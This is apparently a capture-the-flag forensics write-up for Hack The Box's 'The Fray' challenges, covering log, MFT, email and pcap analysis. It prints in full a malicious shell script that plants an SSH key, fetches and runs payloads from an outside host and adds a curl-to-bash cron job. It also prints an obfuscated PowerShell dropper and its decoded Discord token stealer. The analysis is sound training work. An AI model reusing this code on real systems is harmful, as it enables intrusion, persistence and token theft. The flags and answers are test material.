# Scenario
"We used to be peaceful and had enough tech to keep us all happy. What do you think about that? 

These data disks alluded to some "societal golden age." No fighting, no backstabbing, and no factions fighting for some lousy title.

Good, great for them-

Because all we get to look forward to is "The Fray."

alarms blaring

Oh, look-... it's showtime." 

(Quote: Luxx, faction leader of the Phreaks)

💥 Welcome to "The Fray." A societal gauntlet made of the most cunning, dedicated, and bloodthirsty factions. We are all bound by the same rule–be one of the last factions standing. All brought to your overlords and sponsors at KORP™.

Our city's lights bring people from far and wide. It's one of the last remaining mega structures left after the Great Division took place. But, as far as we are concerned, KORP™ is all there ever was and will be. 

They hold The Fray every four years to find the "best and the brightest around." Those who make it through their technological concoction of challenges become the "Legionaries," funded factions who get to sit on easy-street for the time between the next fight.

## Task 1: It Has Begun
Question: The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.

Flag: `HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}`

We are given a shell script, the flag is broken up into two parts within the script.

```sh
#!/bin/sh

if [ "$HOSTNAME" != "KORP-STATION-013" ]; then
    exit
fi

if [ "$EUID" -ne 0 ]; then
    exit
fi

docker kill $(docker ps -q)
docker rm $(docker ps -a -q)

echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "128.90.59.19 legions.korp.htb" >> /etc/hosts

for filename in /proc/*; do
    ex=$(ls -latrh $filename 2> /dev/null|grep exe)
    if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew"; then
        result=$(echo "$filename" | sed "s/\/proc\///")
        kill -9 $result
        echo found $filename $result
    fi
done

ARCH=$(uname -m)
array=("x86" "x86_64" "mips" "aarch64" "arm")

if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then
  exit
fi


cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;
echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
```

The first part: `user@tS_u0y_ll1w{BTH`
```
└─$ echo tS_u0y_ll1w{BTH | rev                     
HTB{w1ll_y0u_St
```
The second part: `bash -c 'NG5kX3kwdVJfR3IwdU5kISF9'`
```
└─$ echo NG5kX3kwdVJfR3IwdU5kISF9 | base64 --decode
4nd_y0uR_Gr0uNd!!}                                                                                                                           
```

## Task 2: An unusual sighting 
Question: As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!

Flag: `HTB{B3sT_0f_luck_1n_th3_Fr4y!!}`

We are given two log files to investigate, the SSH logs and the Bash History. Using them, we can figure out what the attacker has done to access the server.

<details>
<summary>
nc 94.237.52.91 54396
</summary>

```
└─$ nc 94.237.52.91 54396

+---------------------+---------------------------------------------------------------------------------------------------------------------+
|        Title        |                                                     Description                                                     |
+---------------------+---------------------------------------------------------------------------------------------------------------------+
| An unusual sighting |                        As the preparations come to an end, and The Fray draws near each day,                        |
|                     |             our newly established team has started work on refactoring the new CMS application for the competition. |
|                     |                  However, after some time we noticed that a lot of our work mysteriously has been disappearing!     |
|                     |                     We managed to extract the SSH Logs and the Bash History from our dev server in question.        |
|                     |               The faction that manages to uncover the perpetrator will have a massive bonus come the competition!   |
|                     |                                                                                                                     |
|                     |                                            Note: Operating Hours of Korp: 0900 - 1900                               |
+---------------------+---------------------------------------------------------------------------------------------------------------------+


Note 2: All timestamps are in the format they appear in the logs

What is the IP Address and Port of the SSH Server (IP:PORT)
> 100.107.36.130:2221
[+] Correct!

What time is the first successful Login
> 2024-02-13 11:29:50
[+] Correct!

What is the time of the unusual Login
> 2024-02-19 04:00:14
[+] Correct!

What is the Fingerprint of the attacker's public key
> OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[+] Correct!

What is the first command the attacker executed after logging in                                                                                                                           
> whoami                                                                                                                                                                                   
[+] Correct!
                                                                                                                                                                                           
What is the final command the attacker executed before logging out                                                                                                                         
> ./setup                                                                                                                                                                                  
[+] Correct!
                                                                                                                                                                                           
[+] Here is the flag: HTB{B3sT_0f_luck_1n_th3_Fr4y!!}                                                                                                                                      
```
</details>

1. What is the IP Address and Port of the SSH Server (IP:PORT)

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/cd680426-f59d-4c4b-a659-e459860387cf)

2. What time is the first successful Login

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/094ce796-d822-41cb-b922-23f045bcb613)

3. What is the time of the unusual Login

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/04a12099-d036-4aae-abc8-e52caa7aac27)

4. What is the Fingerprint of the attacker's public key'

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/505f0b2f-459c-4fb5-9cd1-6a12cd4f3112)

5. What is the first command the attacker executed after logging in

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/d9d7b4c5-f950-46b3-9780-e3aa28788a0d)

6. What is the final command the attacker executed before logging out

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/b89ace7a-7634-431b-b9d3-40898d66417f)

## Task 3: Urgent
Question: In the midst of Cybercity's "Fray," a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions' destiny.

Flag: `HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}`

We are given a phishing email that contains two encoded messages within it. The flag can be found in the second encoded message.

![cyberchef2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ce8a249a-c0a8-40fd-a6bb-e8d20b1a7f19)

## Task 4: Pursue The Tracks
Question: Luxx, leader of The Phreaks, immerses himself in the depths of his computer, tirelessly pursuing the secrets of a file he obtained accessing an opposing faction member workstation. With unwavering determination, he scours through data, putting together fragments of information trying to take some advantage on other factions. To get the flag, you need to answer the questions from the docker instance.

Flag: `HTB{p4rs1ng_mft_1s_v3ry_1mp0rt4nt_s0m3t1m3s}`

We are given a raw MFT file, so we must parse it first using `MFTEcmd` and analyze the parsed data.

<details>
<summary>
nc 94.237.54.161 46799
</summary>
  
```
└─$ nc 94.237.54.161 46799

+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
|       Title       |                                                                    Description                                                                    |
+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
| Pursue The Tracks |                                    Luxx, leader of The Phreaks, immerses himself in the depths of his computer,                                   |
|                   |                      tirelessly pursuing the secrets of a file he obtained accessing an opposing faction member workstation.                      |
|                   | With unwavering determination, he scours through data, putting together fragments of information trying to take some advantage on other factions. |
|                   |                                    To get the flag, you need to answer the questions from the docker instance.                                    |
+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+

Files are related to two years, which are those? (for example: 1993,1995)
> 2023,2024
[+] Correct!

There are some documents, which is the name of the first file written? (for example: randomname.pdf)
> Final_Annual_Report.xlsx
[+] Correct!

Which file was deleted? (for example: randomname.pdf)
> Marketing_Plan.xlsx
[+] Correct!

How many of them have been set in Hidden mode? (for example: 43)
> 1
[+] Correct!

Which is the filename of the important TXT file that was created? (for example: randomname.txt)                                                                                            
> credentials.txt                                                                                                                                                                          
[+] Correct!
                                                                                                                                                                                           
A file was also copied, which is the new filename? (for example: randomname.pdf)                                                                                                           
> Financial_Statement_draft.xlsx                                                                                                                                                           
[+] Correct!
                                                                                                                                                                                           
Which file was modified after creation? (for example: randomname.pdf)                                                                                                                      
> Project_Proposal.pdf                                                                                                                                                                     
[+] Correct!
                                                                                                                                                                                           
What is the name of the file located at record number 45? (for example: randomname.pdf)                                                                                                    
> Annual_Report.xlsx                                                                                                                                                                       
[+] Correct!
                                                                                                                                                                                           
What is the size of the file located at record number 40? (for example: 1337)                                                                                                              
> 57344                                                                                                                                                                                    
[+] Correct!
                                                                                                                                                                                           
[+] Here is the flag: HTB{p4rs1ng_mft_1s_v3ry_1mp0rt4nt_s0m3t1m3s}                                                                                                                         
                                                                                                                                                                                           
```
</details>

1. Files are related to two years, which are those? (for example: 1993,1995)

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/509597d0-e66b-40dd-a6b5-a05fa0a31492)

2. There are some documents, which is the name of the first file written? (for example: randomname.pdf)

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/4cde276d-4523-4f1d-9e3c-783a05e58b79)

3. Which file was deleted? (for example: randomname.pdf)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/39f84e1c-5cbd-4cb6-aa98-3b591310d1d4)

4. How many of them have been set in Hidden mode? (for example: 43)

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/dc3aab17-6f12-45c8-9e16-781423803a9f)

5. Which is the filename of the important TXT file that was created? (for example: randomname.txt)

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/a8db662e-edfe-40d5-b0a1-e7f04827605a)

6. A file was also copied, which is the new filename? (for example: randomname.pdf)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/9df8871e-d625-4d34-a4d4-af18d3306572)

7. Which file was modified after creation? (for example: randomname.pdf)

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/04244865-2acd-44a6-b2e4-e3bb762f8348)

8. What is the name of the file located at record number 45? (for example: randomname.pdf)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/74ae27aa-cdef-4da4-81a4-a039224c5ee6)

9. What is the size of the file located at record number 40? (for example: 1337)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/5a427d4a-1ec6-4848-905f-a91d21a65ad7)

## Task 5: Fake Boost
Question: In the shadow of The Fray, a new test called ""Fake Boost"" whispers promises of free Discord Nitro perks. It's a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.

Flag: `HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}`

We are given a pcap file filled with UDP, TCP and HTTP packets. Viewing the HTTP packets, it seems that there were several files being sent. So I went ahead and exported the files to analyze them further.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/eddad807-4c99-4728-a4e9-7608ec173d1a)

Analyzing the `freediscordnitro` file, the powershell code shows the $jozeq3n variable reversing itself and was encoded with base64 after that.

```powershell
$jozeq3n = "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gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK0AIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAiCN8yX8BCIg8yXf91XfxFIv81XfxFIv81Xf91XcBCIv81XfxFIgw3X891Xcx3Xv8FXgw3XcBCffxyXfxFIgw3X89yXf9FXf91Xc9yXf9FffxHIv81XfxHI891XfxFff91XcBCI89Ffgw3XcpQD8BCIf91Xc91XvAyLu8CIv8Ffgw1Xf91Lg8iLgwHIp8FKgwHI8BCffxHI8BCfgACX8BCfgwHI89FKgwHI8BCfgkyXoACffhCIcByXfxFI89CIvwHI8ByLf9FIg8yXfBCI8BCfgwHI8BCfK0Afgw3XvAyLg8CIvACI8BCfvACI8BCIvAyLgACIgwFIfByLf91Jgw3XfBCfgwHIgBiLgwHI8BCYfByLf91JgwHXg8FIv81Xg8Cff9FIvACfgwHI8BCfgwFIfByLcByXg8yXfdCI89FIgwnCNwHI89CIvcyLg8CInAGfgcyL8BCfn8CIvAyJgBCIg81XfByXfByXg8Ffgw3X8BCfcBCI8BCfgw3XfByXfByXgAyXf9FIf91XgAyXf9FIfxHI8BCfgwHIg81XfBCIf91Xg81Xg8FIfxHI8pQD8BCIg8CIcBCIf9FIvwHIg8FIgwHXgAyXfByLgACIgACIgACIgACIgwHIp8FKgwHIcBCfgwHI8BCIgACIgACIgACIgACIgACIgACIgkyXoACIfBCI8BCIgACIgACIgACIgACff91XgACfK0AIf91XgACIf91Xf9FIg81Xf91XgAyXf91XfBCIgACIgACIgACIgACIg8FIfByXgACIfBCIg8FIgACIgACIgACIgACIgACIgACIgACIg8FIf91Xf91XgACIgACIgACIgACIgAyXf91Xf9lCNICI0N3bI1SZ0lmcXpQDK0QfK0QKhRXYExGb1ZGJocmbpJHdTRjNlNXYC9GV6oTX0JXZ252bD5SblR3c5N1W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" ;
$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2>&1> $null ;
$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [sYSTeM.TeXt.ENcODING]::UTf8.geTSTRiNG([SYSTEm.cOnVeRT]::FRoMBaSe64sTRing("$s0yAY2gmHVNFd7QZ")) ;
$U9COA51JG8eTcHhs0YFxrQ3j = "Inv"+"OKe"+"-EX"+"pRe"+"SSI"+"On" ; New-alIaS -Name pWn -VaLuE $U9COA51JG8eTcHhs0YFxrQ3j -FoRcE ; pWn $lOADcODEoPX3ZoUgP2T6cvl3KEK ;
```

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/8a79e316-8d61-4ef2-87b1-534f9406943a)

Decoding it, we get a malware related to the free Discord nitro scam. In this case, the first part of the flag can be found in the code.

```powershell
$URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"

function Steal {
    param (
        [string]$path
    )

    $tokens = @()

    try {
        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {
            
            try {
                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop

                foreach ($regex in @('[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}', 'mfa\.[\w-]{80,95}')) {
                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                        $_.Matches.Value
                    }
                }
            } catch {}
        }
    } catch {}

    return $tokens
}

function GenerateDiscordNitroCodes {
    param (
        [int]$numberOfCodes = 10,
        [int]$codeLength = 16
    )

    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $codes = @()

    for ($i = 0; $i -lt $numberOfCodes; $i++) {
        $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
        $codes += $code
    }

    return $codes
}

function Get-DiscordUserInfo {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    process {
        try {
            $Headers = @{
                "Authorization" = $Token
                "Content-Type" = "application/json"
                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
            }

